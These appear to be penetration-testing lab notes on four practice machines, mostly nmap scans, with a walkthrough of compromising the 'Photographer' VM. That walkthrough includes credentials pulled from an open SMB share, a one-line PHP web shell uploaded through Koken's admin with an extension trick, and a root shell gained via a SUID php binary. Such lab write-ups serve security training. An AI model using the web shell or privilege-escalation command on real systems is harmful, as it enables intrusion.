maguire-1: 192.168.100.224
Merciless: 192.168.100.39
morpheus-1: 192.168.100.22
adi-1: 192.168.100.149

## Maguire-1 192.168.100.224

Initial nmap scan:
```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Immersion
```

## Merciless 192.168.100.39
Initial nmap scan:
```
53/tcp  open  domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)  
| dns-nsid:    
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu  
110/tcp open  pop3        Dovecot pop3d  
|_pop3-capabilities: CAPA AUTH-RESP-CODE UIDL STLS SASL TOP PIPELINING RESP-CODES  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server  
| Not valid before: 2018-08-24T13:22:55  
|_Not valid after:  2028-08-23T13:22:55  
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
143/tcp open  imap        Dovecot imapd (Ubuntu)  
|_ssl-date: TLS randomness does not represent time  
|_imap-capabilities: OK LOGIN-REFERRALS STARTTLS IDLE IMAP4rev1 more listed SASL-IR have LOGINDISABLEDA0001 capabilities ENABLE Pre-login ID LITERAL+ post-  
login  
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server  
| Not valid before: 2018-08-24T13:22:55  
|_Not valid after:  2028-08-23T13:22:55  
445/tcp open              Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)  
993/tcp open  ssl/imap    Dovecot imapd (Ubuntu)  
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server  
| Not valid before: 2018-08-24T13:22:55  
|_Not valid after:  2028-08-23T13:22:55  
995/tcp open  ssl/pop3    Dovecot pop3d  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server  
| Not valid before: 2018-08-24T13:22:55  
|_Not valid after:  2028-08-23T13:22:55  
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Host script results:  
| smb-os-discovery:    
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)  
|   Computer name: mercy  
|   NetBIOS computer name: MERCY\x00  
|   Domain name: \x00  
|   FQDN: mercy  
|_  System time: 2023-10-25T07:19:11+08:00  
| smb-security-mode:    
|   account_used: guest  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: disabled (dangerous, but default)  
| smb2-security-mode:    
|   3:1:1:    
|_    Message signing enabled but not required  
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  
|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: -1s  
| smb2-time:    
|   date: 2023-10-24T23:19:11  
|_  start_date: N/A
```

## Morpheus 192.168.100.22
Initial nmap scan:
```
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)  
| ssh-hostkey:    
|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)  
80/tcp open  http    Apache httpd 2.4.51 ((Debian))  
|_http-server-header: Apache/2.4.51 (Debian)  
|_http-title: Morpheus:1  
81/tcp open  http    nginx 1.18.0  
|_http-server-header: nginx/1.18.0  
| http-auth:    
| HTTP/1.1 401 Unauthorized\x0D  
|_  Basic realm=Meeting Place  
|_http-title: 401 Authorization Required  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Adi-1 192.168.100.149
Initial nmap scan:
```
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Photographer by v1n1v131r4  
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
445/tcp  open  @           Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)  
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-trane-info: Problem with XML parsing of /evox/about  
|_http-title: daisa ahomi  
|_http-generator: Koken 0.22.24  
|_http-open-proxy: Proxy might be redirecting requests  
Service Info: Host: PHOTOGRAPHER  
  
Host script results:  
| smb2-security-mode:    
|   3:1:1:    
|_    Message signing enabled but not required  
| smb-security-mode:    
|   account_used: guest  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: disabled (dangerous, but default)  
|_clock-skew: mean: 1h19m58s, deviation: 2h18m35s, median: -2s  
| smb-os-discovery:    
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)  
|   Computer name: photographer  
|   NetBIOS computer name: PHOTOGRAPHER\x00  
|   Domain name: \x00  
|   FQDN: photographer  
|_  System time: 2023-10-24T19:20:06-04:00  
| smb2-time:    
|   date: 2023-10-24T23:20:05  
|_  start_date: N/A  
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

### 80

* apache site, seems useless

### 8000
* used daisa creds on /admin
* uploaded php webshell
	* `<?php system($_GET['cmd']);?>` > `balls.php.jpg`
	* pivoted to interactive php webshell cause it didn't work
	* used burp to change extension to balls.php
	* mouse over download file to get path
	* user flag: `d41d8cd98f00b204e9800998ecf8427e`

### 445
* found /sambashare
	* mailsent.txt
		* had creds daisa@photographer.com/babygirl
	* wordpress backup

### Privesc

SUID:
```
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/xorg/Xorg.wrap
./usr/lib/snapd/snap-confine
./usr/lib/openssh/ssh-keysign
./usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/sbin/pppd
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/php7.2
./usr/bin/sudo
./usr/bin/chsh
./usr/bin/chfn
./bin/ping
./bin/fusermount
./bin/mount
./bin/ping6
./bin/umount
./bin/su
```

* note php has SUID set
* used `php -r "pcntl_exec('/bin/sh', ['-p']);"` to spawn a root shell

### Report

#### Exposed SMB Share
#### Koken Authenticated Unrestricted File Upload
#### SUID set on PHP binary
